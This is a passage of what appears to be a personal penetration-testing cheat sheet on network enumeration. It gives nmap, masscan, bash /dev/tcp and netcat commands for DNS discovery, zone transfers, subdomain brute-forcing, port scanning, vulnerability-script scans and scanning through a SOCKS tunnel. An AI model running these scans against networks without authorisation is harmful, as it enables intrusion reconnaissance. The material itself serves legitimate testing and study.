perl <span class="nt">-MSocket</span> <span class="nt">-E</span> <span class="s1">'$_?say+Socket::getnameinfo$$_{addr},"",Socket::NIx_NOSERV:""for+Socket::getaddrinfo"&lt;ip&gt;","",{socktype,SOCK_RAW,flags,Socket::AI_NUMERICHOST,family,AF_INET4}'</span></code></pre></div></div></li> </ul> <h3 id="network-enumeration--dns-and-hostnames--sub-network-resolution"> <a href="#network-enumeration--dns-and-hostnames--sub-network-resolution" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames--sub-network-resolution"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Sub-Network Resolution </h3> <ul> <li>Locate all possible DNS servers in the network:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Use -sS for alternate TCP scan</span>
<span class="c"># Maybe use 54,443 in a second round</span>
nmap <span class="nt">-sU</span> <span class="nt">-sV</span> <span class="nt">--open</span> <span class="nt">--reason</span> <span class="nt">-T4</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-Pn</span> <span class="nt">-oG</span> dns.grep <span class="nt">-p</span> 53,5353 10.0.0.1/24</code></pre></div></div></li> <li>Find which of the possible DNSs obtained before are legit and their hostname:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Replace -U with -T for TCP ports</span>
<span class="c"># Change -W &lt;timeout&gt; and -P &lt;procs&gt;</span>
<span class="c"># if unreliable results</span>
<span class="nb">awk</span> <span class="s1">'/\/open/{gsub(" [0-9]+", "&amp; " $2 " " $2 "\n"); gsub("/open[^,]*,?|.*Ports:",""); print}'</span> dns.grep | xargs <span class="nt">-n</span> 3 <span class="nt">-P</span> 0 <span class="nt">--</span> host <span class="nt">-U</span> <span class="nt">-W1</span> <span class="nt">-p</span> | <span class="nb">awk</span> <span class="s1">'!/timed out|^$|end of file/; /arpa/{print ""}'</span> | <span class="nb">tee </span>dnses.txt</code></pre></div></div></li> <li>Find the domain names of all the machines in the network using the detected DNS (machines without a name won&#8217;t be listed):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Reminder: test TCP DNSs with -T</span>
<span class="nb">awk</span> <span class="nt">-F</span><span class="s1">' |#'</span> <span class="s1">'/#/{print $2, $3}'</span> dnses.txt | <span class="k">while </span><span class="nb">read </span>dns port<span class="p">;</span> <span class="k">do </span><span class="nb">seq </span>254 | xargs <span class="nt">-I</span><span class="o">{}</span> <span class="nt">-P</span> 0 <span class="nt">--</span> host <span class="nt">-U</span> <span class="nt">-W1</span> <span class="nt">-p</span><span class="k">${</span><span class="nv">port</span><span class="k">}</span> <span class="s2">"</span><span class="k">${</span><span class="nv">dns</span><span class="p">%.*</span><span class="k">}</span><span class="s2">"</span>.<span class="o">{}</span> <span class="k">${</span><span class="nv">dns</span><span class="k">}</span><span class="p">;</span> <span class="k">done</span> | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'/domain name/{s/\([0-9]\+\.\)\([0-9]\+\.\)\([0-9]\+\.\)\([0-9]\+\.\)/\4\3\2\1/;s/\.in.* \|\.$/ /gp}'</span> | <span class="nb">sort</span> <span class="nt">-t</span><span class="nb">.</span> <span class="nt">-k4</span> <span class="nt">-nu</span> | column <span class="nt">-t</span></code></pre></div></div></li> <li>Obtain the hostname of a Domain Controller with <code>nslookup</code>:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">nslookup</span>

<span class="kd">set</span> <span class="nb">type</span><span class="o">=</span><span class="kd">all</span>
_ladp._tcp.dc._msdcs.&lt;domain&gt;</code></pre></div></div></li> </ul> <h3 id="network-enumeration--dns-and-hostnames--zone-transfer"> <a href="#network-enumeration--dns-and-hostnames--zone-transfer" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames--zone-transfer"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Zone Transfer </h3> <h4 id="network-enumeration--dns-and-hostnames--zone-transfer--notes"> <a href="#network-enumeration--dns-and-hostnames--zone-transfer--notes" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames--zone-transfer--notes"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Notes </h4> <ul> <li>Attempt to perform them especially if there are servers with TCP port 53 (or 5353) open</li> </ul> <h4 id="network-enumeration--dns-and-hostnames--zone-transfer--identify"> <a href="#network-enumeration--dns-and-hostnames--zone-transfer--identify" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames--zone-transfer--identify"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Identify </h4> <h5 id="network-enumeration--dns-and-hostnames--zone-transfer--identify--host"> <a href="#network-enumeration--dns-and-hostnames--zone-transfer--identify--host" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames--zone-transfer--identify--host"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Host </h5> <ul> <li>Address complete lookup:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Non-standard port with -p &lt;port&gt;</span>
host <span class="nt">-t</span> ANY &lt;ip&gt; <span class="o">[</span>&lt;dns&gt;]
<span class="c"># -t NS to only show nameservers</span>

<span class="c"># Using the "all" flag</span>
host <span class="nt">-a</span> &lt;ip&gt; <span class="o">[</span>&lt;dns&gt;]</code></pre></div></div></li> <li>List all the records in the zone:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>host <span class="nt">-l</span> <span class="nt">-t</span> ANY &lt;<span class="nb">hostname</span><span class="o">&gt;</span> <span class="o">[</span>&lt;dns&gt;]
<span class="c"># -t NS to only show nameservers</span>

<span class="c"># Using the "all" flag</span>
host <span class="nt">-l</span> <span class="nt">-a</span> &lt;<span class="nb">hostname</span><span class="o">&gt;</span> <span class="o">[</span>&lt;dns&gt;]</code></pre></div></div></li> </ul> <h5 id="network-enumeration--dns-and-hostnames--zone-transfer--identify--nslookup"> <a href="#network-enumeration--dns-and-hostnames--zone-transfer--identify--nslookup" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames--zone-transfer--identify--nslookup"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> NSlookup </h5> <ul> <li>Hostname resolution:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nslookup

server &lt;dns&gt;
&lt;ip&gt;
<span class="c"># Hostname returned</span></code></pre></div></div></li> <li>List all the records in the zone:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nslookup

server &lt;dns&gt;
<span class="nb">set </span><span class="nv">q</span><span class="o">=</span>any
<span class="c"># Also try: set type=NS</span>
&lt;<span class="nb">hostname</span><span class="o">&gt;</span></code></pre></div></div></li> </ul> <h5 id="network-enumeration--dns-and-hostnames--zone-transfer--identify--dig"> <a href="#network-enumeration--dns-and-hostnames--zone-transfer--identify--dig" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames--zone-transfer--identify--dig"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Dig </h5> <ul> <li>Hostname resolution:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Add +search to read resolv.conf</span>
dig @&lt;dns&gt; &lt;ip&gt;
<span class="c"># Add +short for compact output</span>

<span class="c"># Reverse resolution</span>
dig @&lt;dns&gt; <span class="nt">-x</span> &lt;ip&gt;</code></pre></div></div></li> <li>ANY details:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Add +tcp or +notcp to use TCP/UDP</span>
dig @&lt;dns&gt; <span class="nt">-4</span> &lt;ipv4&gt; ANY +nocmd +recurse +unexpected +fail +additional
<span class="c"># Use NS to show nameservers only</span>
<span class="c"># Add +nssearch to search for names</span></code></pre></div></div></li> <li>Perform Zone Transfer:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Can use -q &lt;hostname&gt; instead</span>
dig @&lt;dns&gt; &lt;<span class="nb">hostname</span><span class="o">&gt;</span> AXFR
<span class="c"># Can use -t AXFR instead</span></code></pre></div></div></li> </ul> <h3 id="network-enumeration--dns-and-hostnames--bruteforce"> <a href="#network-enumeration--dns-and-hostnames--bruteforce" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames--bruteforce"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bruteforce </h3> <h4 id="network-enumeration--dns-and-hostnames--bruteforce--dictionaries"> <a href="#network-enumeration--dns-and-hostnames--bruteforce--dictionaries" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames--bruteforce--dictionaries"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Dictionaries </h4> <ul> <li>Use the <a href="https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS">SecLists</a>: <ul> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/DNS/subdomains-top1million-110000.txt">top1million</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/DNS/bitquark-subdomains-top100000.txt">bitquark</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/DNS/deepmagic.com-prefixes-top50000.txt">deepmagic</a></li> </ul> </li> </ul> <h4 id="network-enumeration--dns-and-hostnames--bruteforce--ffuf"> <a href="#network-enumeration--dns-and-hostnames--bruteforce--ffuf" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames--bruteforce--ffuf"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Ffuf </h4> <ul> <li><a href="https://github.com/ffuf/ffuf">Site</a> - Most flexible fuzzer:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-u</span> https://FUZZ.&lt;domain&gt; <span class="nt">-c</span> <span class="nt">-ac</span> <span class="nt">-w</span> &lt;domlist&gt;
<span class="c"># Use -s to only show results</span>
<span class="c"># See URL Enumeration for more info</span>

<span class="c"># vhost discovery</span>
ffuf <span class="nt">-u</span> https://&lt;ip&gt; <span class="nt">-H</span> <span class="s2">"Host: FUZZ.&lt;domain&gt;"</span> <span class="nt">-c</span> <span class="nt">-ac</span> <span class="nt">-w</span> &lt;domlist&gt;
<span class="c"># Don't forget to also try HTTP</span></code></pre></div></div></li> </ul> <h4 id="network-enumeration--dns-and-hostnames--bruteforce--gobuster"> <a href="#network-enumeration--dns-and-hostnames--bruteforce--gobuster" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames--bruteforce--gobuster"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Gobuster </h4> <ul> <li><a href="https://github.com/OJ/gobuster">Site</a> - Dir/File/DNS/VHost fuzzer:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dns <span class="nt">-t</span> 30 <span class="nt">-d</span> &lt;domain&gt; <span class="nt">-w</span> &lt;wlist&gt;
<span class="c"># Use -z to hide the progress with</span>
<span class="c"># See URL Enumeration for more info</span></code></pre></div></div></li> </ul> <h3 id="network-enumeration--dns-and-hostnames--hosts"> <a href="#network-enumeration--dns-and-hostnames--hosts" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames--hosts"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Hosts </h3> <ul> <li>Those domains found in certificates without DNSs to resolve shall be added to <code>/etc/hosts</code>:<div class="language-conf highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="n">ip</span>&gt; &lt;<span class="n">hostname1</span>&gt; &lt;<span class="n">hostname2</span>&gt;...</code></pre></div></div></li> </ul> <h3 id="network-enumeration--dns-and-hostnames--change-dns"> <a href="#network-enumeration--dns-and-hostnames--change-dns" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames--change-dns"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Change DNS </h3> <h4 id="network-enumeration--dns-and-hostnames--change-dns--systemd-resolved"> <a href="#network-enumeration--dns-and-hostnames--change-dns--systemd-resolved" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames--change-dns--systemd-resolved"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Systemd-resolved </h4> <ul> <li>Add new DNS and domain:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Add DNS</span>
resolvectl dns &lt;iface&gt; &lt;dns-ip&gt;

<span class="c"># State domains to resolve</span>
resolvectl domain &lt;iface&gt; &lt;domain&gt;
<span class="c"># Domain can be "local", "htb", etc</span></code></pre></div></div></li> </ul> <h4 id="network-enumeration--dns-and-hostnames--change-dns--resolv-conf"> <a href="#network-enumeration--dns-and-hostnames--change-dns--resolv-conf" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames--change-dns--resolv-conf"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Resolv.conf </h4> <ul> <li>Note that I couldn&#8217;t get this to work, maybe because of a lack of <code>search &lt;domain&gt;</code> before <code>nameserver</code></li> <li>Add new DNS:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Note that resolv.conf gets edited</span>
<span class="c"># by nm, resolvconf, etc</span>
<span class="nb">echo</span> <span class="s1">'nameserver &lt;dns-ip&gt;'</span> <span class="o">&gt;&gt;</span> /etc/resolv.conf
<span class="c"># Note that options are usually</span>
<span class="c"># required to resolve with all DNSs</span></code></pre></div></div></li> </ul> <h4 id="network-enumeration--dns-and-hostnames--change-dns--networkmanager"> <a href="#network-enumeration--dns-and-hostnames--change-dns--networkmanager" class="anchor-heading" aria-labelledby="network-enumeration--dns-and-hostnames--change-dns--networkmanager"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> NetworkManager </h4> <ul> <li>Note that I couldn&#8217;t get this to work, maybe because I didn&#8217;t specify the domain to be searched by the conn</li> <li>Add new DNS and DNS options:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Find &lt;connection-name&gt;</span>
nmcli con show

<span class="c"># Add DNS</span>
nmcli con mod &lt;connection-name&gt; +ipv4.dns <span class="s2">"&lt;dns-ip&gt;"</span>

<span class="c"># Add DNS options</span>
nmcli con mod &lt;connection-name&gt; +ipv4.dns-options rotate

nmcli con mod &lt;connection-name&gt; +ipv4.dns-options <span class="nb">timeout</span>:1

nmcli con mod &lt;connection-name&gt; +ipv4.dns-options retries:1

<span class="c"># Reload connection</span>
nmcli con reload &lt;connection-name&gt;</code></pre></div></div></li> </ul> <h2 id="network-enumeration--ping"> <a href="#network-enumeration--ping" class="anchor-heading" aria-labelledby="network-enumeration--ping"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Ping </h2> <ul> <li>Batch ping-sweep:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="na">/L </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="m">1</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">255</span><span class="o">)</span> <span class="k">do</span> @ping <span class="na">-n </span><span class="m">1</span> <span class="na">-w </span><span class="m">200</span> <span class="m">10</span>.0.0.<span class="vm">%i</span> <span class="o">&gt;</span> <span class="kr">nul</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="m">10</span>.0.0.<span class="vm">%i</span> <span class="kd">is</span> <span class="kd">up</span></code></pre></div></div></li> </ul> <h2 id="network-enumeration--ports"> <a href="#network-enumeration--ports" class="anchor-heading" aria-labelledby="network-enumeration--ports"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Ports </h2> <h3 id="network-enumeration--ports--scan"> <a href="#network-enumeration--ports--scan" class="anchor-heading" aria-labelledby="network-enumeration--ports--scan"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Scan </h3> <h4 id="network-enumeration--ports--scan--nmap"> <a href="#network-enumeration--ports--scan--nmap" class="anchor-heading" aria-labelledby="network-enumeration--ports--scan--nmap"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Nmap </h4> <ul> <li>Quick TCP - Top 100 ports - SYN Scan:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -T&lt;0-5&gt; Timing of the scan</span>
<span class="c"># -T0 -&gt; slowest | -T5 fastest</span>
<span class="c"># Improve results by lowering -T</span>
<span class="c"># -T4 is good enough for fast networks</span>
<span class="c"># -T3 is the default</span>
<span class="c"># -T2 and less for cautious</span>
<span class="c"># Figuring --min-rate is a priority</span>
<span class="c"># Use --max-rate 5 if WAF blocks IP with</span>
<span class="c">#  --scan-delay 5ms --max-scan-delay 6ms</span>
<span class="c"># -sT for CONNECT scan</span>
<span class="c"># Ignore Windows ports above 49152</span>
<span class="c"># Remove -n to resolve &lt;hostname&gt;</span>
nmap <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">--open</span> <span class="nt">--reason</span> <span class="nt">-T4</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">--top-ports</span><span class="o">=</span>100 <span class="nt">-oG</span> &lt;name&gt;-100-tcp.gnmap &lt;ip/hostname&gt;
<span class="c"># Try CONNECT scan if no results</span></code></pre></div></div></li> <li>Full TCP - all ports - SYN Scan:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -sT for CONNECT scan</span>
nmap <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">--open</span> <span class="nt">--reason</span> <span class="nt">-T4</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-p-</span> <span class="nt">-oG</span> &lt;name&gt;-all-tcp.gnmap &lt;ip/hostname&gt;
<span class="c"># Try CONNECT scan if no results</span></code></pre></div></div></li> <li>Quick UDP - Top 50 ports:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># --min-rate is always less for UDP</span>
nmap <span class="nt">-sU</span> <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">--open</span> <span class="nt">--reason</span> <span class="nt">-T4</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">--top-ports</span><span class="o">=</span>50 <span class="nt">-oG</span> &lt;name&gt;-50-udp.gnmap &lt;ip/hostname&gt;
<span class="c"># If only open|filtered:</span>
<span class="c">#  Remove -sV unless scan was fast</span></code></pre></div></div></li> <li>Print hosts with their open ports using nmap grep output:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">awk</span> <span class="s1">'/\/open/{gsub("/open[^,]*,?",""); match($0,"[0-9 ]+$"); print $2 substr($0,RSTART)}'</span> &lt;scan&gt;.gnmap</code></pre></div></div></li> <li>Update scripts:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script-updatedb</span></code></pre></div></div></li> <li>Default scripts + Deep fingerprint:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -sT for CONNECT scan</span>
<span class="c"># -sU for UDP scan</span>
<span class="c"># Provide both -sS and -sU along</span>
<span class="c"># with -p U:&lt;udp-port&gt;,T:&lt;tcp-port&gt;</span>
nmap <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-A</span> <span class="nt">--open</span> <span class="nt">--reason</span> <span class="nt">-Pn</span> <span class="nt">-T4</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-p</span>&lt;ports&gt; &lt;ip/hostname&gt;</code></pre></div></div></li> <li>Vulnerable scripts:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -sT for CONNECT scan</span>
<span class="c"># -sU for UDP scan</span>
<span class="c"># Provide both -sS and -sU along</span>
<span class="c"># with -p U:&lt;udp-port&gt;,T:&lt;tcp-port&gt;</span>
nmap <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">--open</span> <span class="nt">-Pn</span> <span class="nt">-T4</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">--script</span><span class="o">=</span>vuln <span class="nt">-p</span>&lt;ports&gt; &lt;ip/hostname&gt;

<span class="c"># Vuln scripts not in the vuln pack</span>
nmap <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">--open</span> <span class="nt">-Pn</span> <span class="nt">-T4</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">--script</span><span class="o">=</span><span class="se">\*</span>vuln<span class="se">\*</span> <span class="nt">-p</span>&lt;ports&gt; &lt;ip/hostname&gt;</code></pre></div></div></li> <li>? ports accessible with netcat:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Note how long it takes nc to conn</span>
<span class="nb">time </span>nc <span class="nt">-nv</span> &lt;ip&gt; &lt;port&gt;
<span class="c"># echo quit | time nc ... to measure</span>

<span class="c"># Edit nmap/nmap-service-probes</span>
locate nmap-service-probes

<span class="c"># Set totalwaitms to the nc time</span>
<span class="c"># Also alter the NSE scripts timeout</span>
<span class="c"># or add the appropriate script-args</span>
nmap <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">--open</span> <span class="nt">-Pn</span> <span class="nt">-T4</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-p</span>&lt;?ports&gt; &lt;ip/hostname&gt;
<span class="c"># --script-timeout=&lt;t&gt; ends after t</span></code></pre></div></div></li> <li>Full UDP - all ports - Really slow:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Only use -sV with open ports</span>
nmap <span class="nt">-sU</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">--open</span> <span class="nt">--reason</span> <span class="nt">-T4</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-p-</span> <span class="nt">-oG</span> &lt;name&gt;-all-udp.gnmap &lt;ip/hostname&gt;</code></pre></div></div></li> <li>Segmented scan over SOCKS tunnel:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Using tun2socks for improvement</span>
<span class="nb">sudo</span> <span class="nt">-v</span><span class="p">;</span> <span class="nb">seq </span>100 100 65535 | <span class="k">while </span><span class="nb">read </span>ports<span class="p">;</span> <span class="k">do </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">--open</span> <span class="nt">--reason</span> <span class="nt">-T4</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-p</span><span class="k">$((</span>ports <span class="o">-</span> <span class="m">100</span><span class="k">))</span>-<span class="nv">$ports</span> <span class="nt">-oG</span> tun-100-tcp.gnmap <span class="nt">-e</span> tun10 &lt;ip&gt; 2&gt;&amp;1<span class="p">;</span> <span class="nb">cat </span>tun-100-tcp.gnmap <span class="o">&gt;&gt;</span> tun-all-tcp.gnmap<span class="p">;</span> <span class="nb">sleep </span>2<span class="p">;</span> <span class="k">done</span> | <span class="nb">stdbuf</span> <span class="nt">-i0</span> <span class="nt">-o0</span> <span class="nb">awk</span> <span class="s1">'/open/ &amp;&amp; !/tcpwrapped/'</span> | <span class="nb">tee </span>out.nmap
<span class="c"># chisel was used as SOCKS mechanism</span></code></pre></div></div></li> </ul> <h4 id="network-enumeration--ports--scan--masscan"> <a href="#network-enumeration--ports--scan--masscan" class="anchor-heading" aria-labelledby="network-enumeration--ports--scan--masscan"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Masscan </h4> <ul> <li>Install the <a href="https://www.ntop.org/guides/pf_ring/zc.html#supported-cards">Zero Copy driver</a> if your card supports it and check for it:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check if the driver is identified</span>
masscan <span class="nt">--iflist</span>
<span class="c"># If your iface has the PFRING id</span>
<span class="c"># you can add the --pfring flag</span>
<span class="c"># To the scans</span></code></pre></div></div></li> <li>Scan all TCP ports:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan <span class="nt">-e</span> &lt;iface&gt; <span class="nt">--rate</span><span class="o">=</span>5000 <span class="nt">-p1-65535</span> <span class="nt">--interactive</span> <span class="nt">-oG</span> &lt;name&gt;-all-tcp.gmscan &lt;ip/hostname&gt;
<span class="c"># You can add --retry 2 or lower the</span>
<span class="c"># rate to make it more accurate</span></code></pre></div></div></li> <li>Scan all UDP ports:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan <span class="nt">-e</span> &lt;iface&gt; <span class="nt">--rate</span><span class="o">=</span>1000 <span class="nt">-pU</span>:1-65535 <span class="nt">--interactive</span> <span class="nt">-oG</span> &lt;name&gt;-all-udp.gmscan &lt;ip/hostname&gt;</code></pre></div></div></li> <li>Print hosts with their open ports using masscan grep output:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sort</span> <span class="nt">-k4</span> &lt;scan&gt;.gmscan | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'\\s|/'</span> <span class="s1">'/open/{if(ip != $4){if(ip){print ""};ip=$4;p=ip}; printf "%s %s", p, $7; p=""} END{print ""}'</span></code></pre></div></div></li> </ul> <h4 id="network-enumeration--ports--scan--bash"> <a href="#network-enumeration--ports--scan--bash" class="anchor-heading" aria-labelledby="network-enumeration--ports--scan--bash"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bash </h4> <ul> <li>Find open ports using bash:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">seq </span>65535 | xargs <span class="nt">-I</span> <span class="o">{}</span> <span class="nb">timeout</span> .2 bash <span class="nt">-c</span> <span class="s2">": &gt; /dev/tcp/10.0.0.1/{}; echo {}"</span></code></pre></div></div></li> </ul> <h3 id="network-enumeration--ports--banners"> <a href="#network-enumeration--ports--banners" class="anchor-heading" aria-labelledby="network-enumeration--ports--banners"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Banners </h3> <h4 id="network-enumeration--ports--banners--netcat"> <a href="#network-enumeration--ports--banners--netcat" class="anchor-heading" aria-labelledby="network-enumeration--ports--banners--netcat"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Netcat </h4> <ul> <li>Grab the banners and interact with the service:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Add -C for adding carriage return</span>
nc <span class="nt">-nv</span> &lt;ip&gt; &lt;port&gt;</code></pre></div></div></li> </ul> <h2 id="network-enumeration--traffic-capture"> <a href="#network-enumeration--traffic-capture" class="anchor-heading" aria-labelledby="network-enumeration--traffic-capture"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Traffic Capture </h2> <h3 id="network-enumeration--traffic-capture--tcpdump"> <a href="#network-enumeration--traffic-capture--tcpdump" class="anchor-heading" aria-labelledby="network-enumeration--traffic-capture--tcpdump"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> tcpdump </h3> <ul> <li>Capture all traffic from an iface:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Filter to a given ip + port exclude</span>
tcpdump <span class="nt">-i</span> &lt;iface&gt; host &lt;ip&gt; and not tcp port &lt;port&gt;</code></pre></div></div></li> <li>Detect remote open ports if a firewall is in the way with <code>ncat</code>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># In remote machine (also -u for UDP)</span>
<span class="nb">seq </span>65535 | xargs <span class="nt">-P</span> 0 <span class="nt">-I</span><span class="o">{}</span> ncat <span class="nt">-p</span> <span class="o">{}</span> <span class="nt">-w</span> 1 &lt;lip&gt; &lt;lport&gt; 2&gt;/dev/null
<span class="c"># &lt;lip&gt; is the machine with tcpdump</span></code></pre></div></div></li> <li>The same can be achieved with <code>socat</code> using SOCKS/TCP4 with <code>sourceport=port</code>, <code>socksport=port</code>, or <code>bind=:&lt;port&gt;</code>, and maybe <code>reuseaddr</code> - TODO</li> </ul> <h2 id="network-enumeration--website---url"> <a href="#network-enumeration--website---url" class="anchor-heading" aria-labelledby="network-enumeration--website---url"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Website / URL </h2> <h3 id="network-enumeration--website---url--discovery"> <a href="#network-enumeration--website---url--discovery" class="anchor-heading" aria-labelledby="network-enumeration--website---url--discovery"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Discovery </h3> <h4 id="network-enumeration--website---url--discovery--nmap"> <a href="#network-enumeration--website---url--discovery--nmap" class="anchor-heading" aria-labelledby="network-enumeration--website---url--discovery--nmap"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Nmap </h4> <ul> 